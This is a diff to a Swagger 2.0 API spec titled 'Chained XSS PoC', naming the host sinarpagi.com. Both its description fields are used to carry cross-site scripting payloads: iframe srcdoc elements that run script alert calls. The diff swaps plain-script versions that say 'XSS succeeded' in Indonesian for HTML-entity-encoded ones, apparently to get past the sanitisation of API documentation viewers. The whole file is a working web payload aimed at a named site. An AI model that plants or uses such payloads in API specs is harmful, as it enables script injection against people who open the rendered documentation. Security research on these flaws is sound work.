@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   title: Chained XSS PoC
   description: >
-    <iframe srcdoc="<script>alert('XSS Berhasil!')</script>"></iframe>
+    <iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>
   version: "1.0"
 host: sinarpagi.com
 basePath: /
@@ -20,7 +20,7 @@ paths:
           required: false
           type: string
           description: >
-            <iframe srcdoc="<script>alert('XSS dari parameter')</script>"></iframe>
+            <iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>
       responses:
         '200':
           description: OK
